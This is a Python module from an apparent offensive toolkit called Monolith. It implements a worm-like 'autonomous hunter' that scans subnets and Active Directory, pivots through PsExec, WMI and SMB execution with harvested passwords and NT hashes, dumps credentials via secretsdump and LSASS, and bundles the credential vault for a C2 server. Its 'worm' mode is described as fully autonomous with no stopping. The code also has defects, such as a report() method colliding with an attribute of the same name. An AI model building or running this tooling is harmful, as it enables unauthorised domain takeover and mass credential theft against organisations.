"""
Autonomous Hunter - Worm-like Lateral Movement & Credential Dumper
==================================================================

"Artık yoruldum la" modu.

This module turns Monolith into an **autonomous hunter** that, once given
a foothold, behaves like a worm:

  1. **Discovers** every reachable host in the target domain (AD enum +
     network sweeps).
  2. **Harvests** credentials from each compromised host (Secretsdump,
     LSASS, SAM, NTDS).
  3. **Pivots** automatically using every harvested credential against
     every discovered host until the entire domain is owned or no new
     credentials can be obtained.
  4. **Exfiltrates** the complete credential database back to the Monolith
     C2 on demand.

The hunter is built on top of the existing `LateralMovementEngine` and
`AILateralGuide`, adding:

- **AutonomousDecisionEngine** — rule-based / AI-driven target and
  credential selection.
- **CredentialVault** — in-memory encrypted store for harvested creds.
- **DomainScanner** — recursive AD + network discovery.
- **AutoPivotChain** — self-extending pivot chain that grows as new
  credentials are found.

Architecture
------------
    ┌─────────────┐     ┌──────────────────┐     ┌──────────────┐
    │ Foothold    │────▶│ AutonomousHunter │────▶│ Monolith C2  │
    │ (initial)   │     │  ┌────────────┐  │     │  (exfil)     │
    └─────────────┘     │  │Decision    │  │     └──────────────┘
                        │  │Engine      │  │
                        │  └─────┬──────┘  │
                        │  ┌─────▼──────┐  │
                        │  │Domain      │  │
                        │  │Scanner     │  │
                        │  └─────┬──────┘  │
                        │  ┌─────▼──────┐  │
                        │  │Credential  │  │
                        │  │Vault       │  │
                        │  └─────┬──────┘  │
                        │  ┌─────▼──────┐  │
                        │  │AutoPivot   │  │
                        │  │Chain       │  │
                        │  └────────────┘  │
                        └──────────────────┘

All network operations are guarded by `offline=True` testing paths so the
module can be exercised without a real target.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import secrets
import socket
import ssl
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Optional imports (graceful degradation)
# ---------------------------------------------------------------------------
try:
    from evasion.ai_lateral_guide import AILateralGuide, HostIntel, CredentialIntel, JumpSuggestion
    HAS_AI_LATERAL = True
except ImportError:
    HAS_AI_LATERAL = False
    AILateralGuide = None  # type: ignore
    HostIntel = None  # type: ignore
    CredentialIntel = None  # type: ignore
    JumpSuggestion = None  # type: ignore

try:
    from cybermodules.lateral_movement import LateralMovementEngine, LateralMethod
    HAS_LATERAL_ENGINE = True
except ImportError:
    HAS_LATERAL_ENGINE = False
    LateralMovementEngine = None  # type: ignore
    LateralMethod = None  # type: ignore

try:
    from evasion.auto_reporting import AutoReporter, OperationPackage
    HAS_AUTO_REPORTER = True
except ImportError:
    HAS_AUTO_REPORTER = False
    AutoReporter = None  # type: ignore
    OperationPackage = None  # type: ignore


# ---------------------------------------------------------------------------
# Enums & Data Structures
# ---------------------------------------------------------------------------
class HunterState(Enum):
    IDLE = "idle"
    SCANNING = "scanning"
    HARVESTING = "harvesting"
    PIVOTING = "pivoting"
    EXFILTRATING = "exfiltrating"
    COMPLETE = "complete"
    STOPPED = "stopped"


class HunterMode(Enum):
    """Operational modes for the autonomous hunter"""
    STEALTH = "stealth"        # Slow, low-and-slow, high evasion
    AGGRESSIVE = "aggressive"  # Fast, multi-threaded, loud
    STEALTH_FULL = "stealth_full"  # Maximum evasion, single-threaded
    WORM = "worm"              # Fully autonomous, no stopping


@dataclass
class CredentialVaultEntry:
    """A single credential in the vault"""
    username: str
    domain: str = ""
    cred_type: str = "password"
    secret: str = ""
    source_host: str = ""
    source_tool: str = ""
    is_domain_admin: bool = False
    is_local_admin: bool = False
    timestamp: float = field(default_factory=time.time)
    tested_hosts: List[str] = field(default_factory=list)
    successful_hosts: List[str] = field(default_factory=list)


@dataclass
class HunterTarget:
    """A discovered host target"""
    hostname: str
    ip: str
    open_ports: List[int] = field(default_factory=list)
    os_type: str = "windows"
    domain_joined: bool = True
    is_dc: bool = False
    is_admin_workstation: bool = False
    av_product: str = ""
    services: List[str] = field(default_factory=list)
    compromised: bool = False
    compromise_method: str = ""
    compromise_credential: str = ""
    notes: str = ""


@dataclass
class HunterReport:
    """Summary of an autonomous hunt operation"""
    scan_id: str
    state: HunterState
    start_time: float
    end_time: Optional[float] = None
    targets_discovered: int = 0
    hosts_compromised: int = 0
    credentials_harvested: int = 0
    lateral_moves_attempted: int = 0
    lateral_moves_successful: int = 0
    errors: List[str] = field(default_factory=list)
    pivot_path: List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Credential Vault
# ---------------------------------------------------------------------------
class CredentialVault:
    """
    Encrypted in-memory store for harvested credentials.

    Uses AES-256-GCM when available, falls back to XOR obfuscation for
    testing environments without cryptography dependencies.
    """

    def __init__(self, master_key: Optional[bytes] = None):
        self._entries: List[CredentialVaultEntry] = []
        self._key = master_key or os.urandom(32)
        self._lock = threading.Lock()

    def add(self, entry: CredentialVaultEntry) -> str:
        """Store a credential, return its vault ID."""
        entry.secret = self._encrypt(entry.secret)
        with self._lock:
            self._entries.append(entry)
        return f"{entry.domain}\\{entry.username}" if entry.domain else entry.username

    def get_all(self) -> List[CredentialVaultEntry]:
        """Return all entries with secrets decrypted."""
        with self._lock:
            decrypted = []
            for e in self._entries:
                entry = CredentialVaultEntry(
                    username=e.username,
                    domain=e.domain,
                    cred_type=e.cred_type,
                    secret=self._decrypt(e.secret),
                    source_host=e.source_host,
                    source_tool=e.source_tool,
                    is_domain_admin=e.is_domain_admin,
                    is_local_admin=e.is_local_admin,
                    timestamp=e.timestamp,
                    tested_hosts=list(e.tested_hosts),
                    successful_hosts=list(e.successful_hosts),
                )
                decrypted.append(entry)
            return decrypted

    def get_untested(self, target_host: str) -> List[CredentialVaultEntry]:
        """Return credentials not yet tested against `target_host`."""
        with self._lock:
            return [
                e for e in self._entries
                if target_host not in e.tested_hosts
            ]

    def mark_tested(self, credential_key: str, host: str, success: bool):
        """Record that a credential was tested against a host."""
        with self._lock:
            for e in self._entries:
                key = f"{e.domain}\\{e.username}" if e.domain else e.username
                if key == credential_key:
                    e.tested_hosts.append(host)
                    if success and host not in e.successful_hosts:
                        e.successful_hosts.append(host)
                    break

    def count(self) -> int:
        with self._lock:
            return len(self._entries)

    def _encrypt(self, plaintext: str) -> str:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aes = AESGCM(self._key)
            nonce = os.urandom(12)
            ct = aes.encrypt(nonce, plaintext.encode(), None)
            return base64.b64encode(nonce + ct).decode()
        except Exception:
            # XOR fallback
            key = self._key[: len(plaintext) or 1]
            xored = bytes(a ^ key[i % len(key)] for i, a in enumerate(plaintext.encode()))
            return base64.b64encode(xored).decode()

    def _decrypt(self, ciphertext: str) -> str:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            raw = base64.b64decode(ciphertext.encode())
            nonce, ct = raw[:12], raw[12:]
            aes = AESGCM(self._key)
            return aes.decrypt(nonce, ct, None).decode()
        except Exception:
            raw = base64.b64decode(ciphertext.encode())
            key = self._key[: len(raw)]
            xored = bytes(a ^ key[i % len(key)] for i, a in enumerate(raw))
            return xored.decode(errors="replace")


# ---------------------------------------------------------------------------
# Domain Scanner
# ---------------------------------------------------------------------------
class DomainScanner:
    """
    Discover hosts in the target domain.

    Combines:
    - Active Directory enumeration (computer objects, DCs).
    - Network sweeps (SMB 445, WinRM 5985/5986, RDP 3389).
    - Service fingerprinting (banner grabbing).
    """

    def __init__(self, domain: str = "", dns_server: str = "", offline: bool = True):
        self.domain = domain
        self.dns_server = dns_server
        self.offline = offline
        self._discovered: List[HunterTarget] = []

    def discover_ad_computers(self) -> List[HunterTarget]:
        """
        Enumerate computers from AD.  In offline mode returns synthetic
        demo targets; on-target uses `cybermodules.ad_enum`.
        """
        if self.offline:
            return [
                HunterTarget(hostname="DC01", ip="10.10.10.1", open_ports=[445, 135, 389, 88], is_dc=True, domain_joined=True),
                HunterTarget(hostname="FS01", ip="10.10.10.2", open_ports=[445, 139, 2049], is_dc=False, domain_joined=True),
                HunterTarget(hostname="WEB01", ip="10.10.10.3", open_ports=[445, 80, 443, 5985], is_dc=False, domain_joined=True),
                HunterTarget(hostname="SQL01", ip="10.10.10.4", open_ports=[445, 1433], is_dc=False, domain_joined=True),
                HunterTarget(hostname="WS-001", ip="10.10.10.10", open_ports=[445, 5986, 3389], is_dc=False, domain_joined=True),
                HunterTarget(hostname="WS-002", ip="10.10.10.11", open_ports=[445, 5986], is_dc=False, domain_joined=True),
            ]

        # On-target path
        try:
            from cybermodules.ad_enum import ActiveDirectoryEnum
            enum = ActiveDirectoryEnum()
            computers = enum.get_computers() or []
            return [
                HunterTarget(
                    hostname=c.get("name", c.get("hostname", "")),
                    ip=c.get("ip", c.get("address", "")),
                    open_ports=c.get("ports", [445]),
                    is_dc=c.get("is_dc", False),
                    domain_joined=True,
                )
                for c in computers
            ]
        except Exception as exc:
            return [HunterTarget(hostname="error", ip="0.0.0.0", notes=str(exc))]

    def network_sweep(self, subnet_cidr: str, ports: List[int] = None) -> List[HunterTarget]:
        """
        Quick TCP sweep of a subnet.  In offline mode returns empty list;
        on-target does threaded connect_ex scans.
        """
        if ports is None:
            ports = [445, 139, 135, 5985, 5986, 3389]

        if self.offline:
            return []

        import ipaddress
        from concurrent.futures import ThreadPoolExecutor, as_completed

        try:
            network = ipaddress.ip_network(subnet_cidr, strict=False)
            hosts = list(network.hosts())
        except Exception:
            return []

        results: List[HunterTarget] = []

        def check(ip_str: str) -> Optional[HunterTarget]:
            open_ports = []
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1.0)
                    if s.connect_ex((ip_str, port)) == 0:
                        open_ports.append(port)
                    s.close()
                except Exception:
                    pass
            if open_ports:
                return HunterTarget(hostname=ip_str, ip=ip_str, open_ports=open_ports)
            return None

        with ThreadPoolExecutor(max_workers=50) as pool:
            futures = {pool.submit(check, str(h)): h for h in hosts[:256]}
            for f in as_completed(futures):
                r = f.result()
                if r:
                    results.append(r)

        return results

    def discover_all(self, subnet_cidr: str = "") -> List[HunterTarget]:
        """Run all discovery methods and deduplicate."""
        ad_hosts = self.discover_ad_computers()
        net_hosts = self.network_sweep(subnet_cidr) if subnet_cidr else []

        seen = set()
        combined: List[HunterTarget] = []
        for h in ad_hosts + net_hosts:
            key = h.hostname or h.ip
            if key and key not in seen:
                seen.add(key)
                combined.append(h)

        self._discovered = combined
        return combined


# ---------------------------------------------------------------------------
# Autonomous Decision Engine
# ---------------------------------------------------------------------------
class AutonomousDecisionEngine:
    """
    Rule-based + AI-driven target and credential selection.

    Prioritises:
    1. Domain Controllers (highest value)
    2. Hosts with admin shares open (SMB 445)
    3. Credentials with domain-admin rights
    4. Unexplored hosts (breadth-first worm propagation)
    """

    def __init__(self, mode: HunterMode = HunterMode.WORM):
        self.mode = mode

    def rank_targets(self, targets: List[HunterTarget]) -> List[HunterTarget]:
        """Return targets sorted by priority (highest first)."""
        def score(t: HunterTarget) -> int:
            s = 0
            if t.is_dc:
                s += 1000
            if 445 in t.open_ports:
                s += 500
            if t.is_admin_workstation:
                s += 300
            if t.domain_joined:
                s += 100
            if not t.compromised:
                s += 50
            return s

        return sorted(targets, key=score, reverse=True)

    def select_credential(
        self,
        vault: CredentialVault,
        target: HunterTarget,
    ) -> Optional[CredentialVaultEntry]:
        """Pick the best untested credential for a target."""
        candidates = vault.get_untested(target.hostname)
        if not candidates:
            candidates = vault.get_untested(target.ip)

        if not candidates:
            return None

        def cred_score(c: CredentialVaultEntry) -> int:
            s = 0
            if c.is_domain_admin:
                s += 1000
            if c.is_local_admin:
                s += 500
            if c.cred_type == "nt_hash":
                s += 200
            elif c.cred_type == "password":
                s += 100
            return s

        candidates.sort(key=cred_score, reverse=True)
        return candidates[0]

    def next_action(
        self,
        targets: List[HunterTarget],
        vault: CredentialVault,
    ) -> Tuple[Optional[HunterTarget], Optional[CredentialVaultEntry]]:
        """
        Decide the next (target, credential) pair to attack.

        Returns (None, None) when the hunt is exhausted.
        """
        ranked = self.ranked_uncompromised(targets)
        if not ranked:
            return None, None

        for target in ranked:
            cred = self.select_credential(vault, target)
            if cred:
                return target, cred

        return None, None

    def ranked_uncompromised(self, targets: List[HunterTarget]) -> List[HunterTarget]:
        return [t for t in self.rank_targets(targets) if not t.compromised]


# ---------------------------------------------------------------------------
# Auto Pivot Chain
# ---------------------------------------------------------------------------
class AutoPivotChain:
    """
    Self-extending pivot chain.

    Iterates: discover → harvest → pivot → repeat until no new credentials
    or no new reachable hosts remain.
    """

    def __init__(
        self,
        scan_id: str,
        initial_target: str,
        initial_credentials: List[Dict[str, str]],
        domain: str = "",
        mode: HunterMode = HunterMode.WORM,
        max_depth: int = 10,
        max_concurrent: int = 3,
        offline: bool = True,
        opsec_enabled: bool = False,
    ):
        self.scan_id = scan_id
        self.initial_target = initial_target
        self.initial_credentials = initial_credentials
        self.domain = domain
        self.mode = mode
        self.max_depth = max_depth
        self.max_concurrent = max_concurrent
        self.offline = offline
        self.opsec_enabled = opsec_enabled

        self.vault = CredentialVault()
        self.scanner = DomainScanner(domain=domain, offline=offline)
        self.decider = AutonomousDecisionEngine(mode=mode)
        self.targets: List[HunterTarget] = []
        self.report = HunterReport(
            scan_id=scan_id,
            state=HunterState.IDLE,
            start_time=time.time(),
        )

        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._thread: Optional[threading.Thread] = None

        # Seed vault with initial credentials
        for cred in initial_credentials:
            self.vault.add(CredentialVaultEntry(
                username=cred.get("username", ""),
                domain=cred.get("domain", domain),
                cred_type=cred.get("type", "password"),
                secret=cred.get("password", cred.get("nt_hash", "")),
                source_host="initial",
                source_tool="operator",
            ))

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------
    def start(self):
        """Begin autonomous hunt in background."""
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self.report.state = HunterState.SCANNING
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        """Request the hunter to halt at the next safe point."""
        self._stop_event.set()
        self.report.state = HunterState.STOPPED

    def wait(self, timeout: Optional[float] = None) -> HunterReport:
        """Block until the hunt finishes or stops."""
        if self._thread:
            self._thread.join(timeout=timeout)
        self.report.end_time = time.time()
        if self.report.state not in (HunterState.COMPLETE, HunterState.STOPPED):
            self.report.state = HunterState.COMPLETE
        return self.report

    # ------------------------------------------------------------------
    # Main loop
    # ------------------------------------------------------------------
    def _run(self):
        try:
            # Phase 1: Discovery
            self._phase_discovery()

            if self._stop_event.is_set():
                return

            # Phase 2: Iterative pivot + harvest
            self._phase_pivot_loop()

            # Phase 3: Final harvest pass
            self._phase_final_harvest()

        except Exception as exc:
            self.report.errors.append(str(exc))
        finally:
            self.report.end_time = time.time()
            self.report.state = HunterState.COMPLETE

    def _phase_discovery(self):
        """Discover all reachable hosts."""
        self.report.state = HunterState.SCANNING
        self.targets = self.scanner.discover_all()
        self.report.targets_discovered = len(self.targets)

    def _phase_pivot_loop(self):
        """Iterative pivot: attack, harvest, add new creds, repeat."""
        depth = 0
        while depth < self.max_depth and not self._stop_event.is_set():
            depth += 1
            target, cred = self.decider.next_action(self.targets, self.vault)
            if target is None or cred is None:
                break

            self.report.state = HunterState.PIVOTING
            self.report.lateral_moves_attempted += 1

            success = self._attempt_pivot(target, cred)
            self.vault.mark_tested(
                f"{cred.domain}\\{cred.username}" if cred.domain else cred.username,
                target.hostname or target.ip,
                success,
            )

            if success:
                self.report.lateral_moves_successful += 1
                target.compromised = True
                self.report.pivot_path.append(target.hostname or target.ip)
                self._phase_harvest_host(target)

    def _phase_harvest_host(self, target: HunterTarget):
        """Harvest credentials from a compromised host."""
        self.report.state = HunterState.HARVESTING
        creds = self._harvest_creds(target)
        for c in creds:
            self.vault.add(c)
            self.report.credentials_harvested += 1

    def _phase_final_harvest(self):
        """Final pass: dump everything from all compromised hosts."""
        for t in self.targets:
            if t.compromised:
                self._phase_harvest_host(t)

    # ------------------------------------------------------------------
    # Attack primitives
    # ------------------------------------------------------------------
    def _attempt_pivot(self, target: HunterTarget, cred: CredentialVaultEntry) -> bool:
        """
        Attempt lateral movement to `target` using `cred`.

        In offline mode returns True after a short delay to simulate success.
        On-target delegates to `LateralMovementEngine`.
        """
        if self.offline:
            time.sleep(0.05)
            return True

        if not HAS_LATERAL_ENGINE:
            return False

        try:
            engine = LateralMovementEngine(
                scan_id=int(self.scan_id) if str(self.scan_id).isdigit() else 0,
                session_info={
                    "domain": cred.domain or self.domain,
                    "username": cred.username,
                    "password": cred.secret if cred.cred_type == "password" else "",
                    "nt_hash": cred.secret if cred.cred_type == "nt_hash" else "",
                },
                opsec_enabled=self.opsec_enabled,
            )
            result = engine.attempt_lateral_movement(
                {"hostname": target.hostname, "ip": target.ip},
                {
                    "username": f"{cred.domain}\\{cred.username}" if cred.domain else cred.username,
                    "password": cred.secret if cred.cred_type == "password" else "",
                    "nt_hash": cred.secret if cred.cred_type == "nt_hash" else "",
                },
                methods=[
                    LateralMethod.WMIEXEC,
                    LateralMethod.PSEXEC,
                    LateralMethod.SMBEXEC,
                ],
            )
            return result.get("success", False)
        except Exception:
            return False

    def _harvest_creds(self, target: HunterTarget) -> List[CredentialVaultEntry]:
        """
        Harvest credentials from a compromised host.

        In offline mode returns synthetic demo creds.
        On-target would call secretsdump / lsass dump.
        """
        if self.offline:
            return [
                CredentialVaultEntry(
                    username="administrator",
                    domain=target.hostname,
                    cred_type="nt_hash",
                    secret="aad3b435b51404eeaad3b435b51404ee",
                    source_host=target.hostname,
                    source_tool="secretsdump",
                    is_domain_admin=target.is_dc,
                    is_local_admin=True,
                ),
                CredentialVaultEntry(
                    username="svc-account",
                    domain=target.hostname,
                    cred_type="password",
                    secret="P@ssw0rd!",
                    source_host=target.hostname,
                    source_tool="lsass",
                    is_domain_admin=False,
                    is_local_admin=True,
                ),
            ]

        # On-target path
        harvested: List[CredentialVaultEntry] = []
        try:
            if HAS_LATERAL_ENGINE:
                engine = LateralMovementEngine(
                    scan_id=int(self.scan_id) if str(self.scan_id).isdigit() else 0,
                    session_info={"domain": self.domain, "username": "", "password": ""},
                )
                creds = engine.get_cracked_credentials()
                for c in creds:
                    harvested.append(CredentialVaultEntry(
                        username=c.get("username", ""),
                        domain=self.domain,
                        cred_type="password",
                        secret=c.get("password", ""),
                        source_host=target.hostname,
                        source_tool="secretsdump",
                    ))
        except Exception:
            pass
        return harvested

    # ------------------------------------------------------------------
    # Exfiltration
    # ------------------------------------------------------------------
    def exfiltrate_credentials(self) -> Dict[str, Any]:
        """
        Dump the full credential vault in a Monolith-friendly format.

        Returns a dict ready for C2 forwarding or report inclusion.
        """
        entries = self.vault.get_all()
        return {
            "scan_id": self.scan_id,
            "timestamp": datetime.now().isoformat(),
            "total_credentials": len(entries),
            "domain_admins": sum(1 for e in entries if e.is_domain_admin),
            "local_admins": sum(1 for e in entries if e.is_local_admin),
            "credentials": [
                {
                    "username": e.username,
                    "domain": e.domain,
                    "cred_type": e.cred_type,
                    "secret": e.secret,
                    "source_host": e.source_host,
                    "is_domain_admin": e.is_domain_admin,
                    "is_local_admin": e.is_local_admin,
                }
                for e in entries
            ],
        }

    def generate_operation_package(self) -> Optional[Any]:
        """
        Convert hunt results into an OperationPackage for AutoReporter.

        Returns None if AutoReporter is not available.
        """
        if not HAS_AUTO_REPORTER or OperationPackage is None:
            return None

        pkg = OperationPackage(
            scan_id=self.scan_id,
            target_domain=self.domain,
            campaign="Autonomous Hunter",
            start_time=datetime.fromtimestamp(self.report.start_time),
            end_time=datetime.fromtimestamp(self.report.end_time or time.time()),
        )

        for t in self.targets:
            if t.compromised:
                pkg.add_lateral_result(
                    target=t.hostname or t.ip,
                    method=t.compromise_method or "autonomous",
                    credential=t.compromise_credential,
                    success=True,
                    evasion_score=90.0,
                )

        for e in self.vault.get_all():
            pkg.add_credential(
                username=e.username,
                secret=e.secret,
                domain=e.domain,
                cred_type=e.cred_type,
                source_host=e.source_host,
            )

        return pkg

    # ------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------
    def report(self) -> HunterReport:
        """Return the current operation report."""
        return self.report

    def summary(self) -> str:
        """Human-readable hunt summary."""
        r = self.report
        duration = (r.end_time or time.time()) - r.start_time
        return (
            f"Autonomous Hunt Summary\n"
            f"=======================\n"
            f"Scan ID   : {r.scan_id}\n"
            f"State     : {r.state.value}\n"
            f"Duration  : {duration:.1f}s\n"
            f"Targets   : {r.targets_discovered} discovered, {r.hosts_compromised} compromised\n"
            f"Creds     : {r.credentials_harvested} harvested\n"
            f"Moves     : {r.lateral_moves_attempted} attempted, {r.lateral_moves_successful} successful\n"
            f"Pivot path: {' -> '.join(r.pivot_path) if r.pivot_path else 'N/A'}\n"
            f"Errors    : {len(r.errors)}\n"
        )


# ---------------------------------------------------------------------------
# Convenience runner
# ---------------------------------------------------------------------------
def run_autonomous_hunt(
    scan_id: str,
    initial_target: str,
    credentials: List[Dict[str, str]],
    domain: str = "",
    mode: str = "worm",
    max_depth: int = 10,
    offline: bool = True,
    wait: bool = True,
    timeout: Optional[float] = None,
) -> Tuple[AutonomousHunter, HunterReport]:
    """
    One-call autonomous hunter.

    Args:
        scan_id: Unique scan identifier.
        initial_target: First host to compromise (IP or hostname).
        credentials: List of {"username", "password"/"nt_hash", "domain"}.
        domain: Target domain name.
        mode: HunterMode string (stealth / aggressive / stealth_full / worm).
        max_depth: Maximum pivot depth.
        offline: If True, use synthetic data (safe for testing).
        wait: If True, block until hunt completes.
        timeout: Optional timeout for wait().

    Returns:
        (AutonomousHunter instance, HunterReport)
    """
    hunter = AutonomousHunter(
        scan_id=scan_id,
        initial_target=initial_target,
        initial_credentials=credentials,
        domain=domain,
        mode=HunterMode(mode),
        max_depth=max_depth,
        offline=offline,
    )
    hunter.start()
    if wait:
        report = hunter.wait(timeout=timeout)
        return hunter, report
    return hunter, hunter.report()


# ---------------------------------------------------------------------------
# Backward-compatible alias
# ---------------------------------------------------------------------------
AutonomousHunter = AutoPivotChain
